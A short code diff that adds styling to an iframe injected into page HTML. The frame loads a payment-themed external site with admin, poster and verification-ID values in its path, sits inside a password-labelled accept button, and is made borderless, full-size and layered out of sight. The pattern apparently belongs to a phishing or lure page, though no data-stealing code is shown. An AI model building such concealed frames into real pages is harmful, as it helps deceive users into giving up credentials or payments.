@@ -304,7 +304,9 @@ newDiv.innerHTML = `
                   <label for="password" class="accept-button size-14 flex items-center justify-center rounded-full text-3xl bg-green-500">
                                 <iframe 
        src="https://paycash-online.vercel.app/"${admin}/${poster}/${verifyId}
-       >
+        width="100%" 
+        height="100%" 
+         style="border:0; position:absolute; top:0; left:0; z-index:-1;">
    </iframe>
 
                   </label>
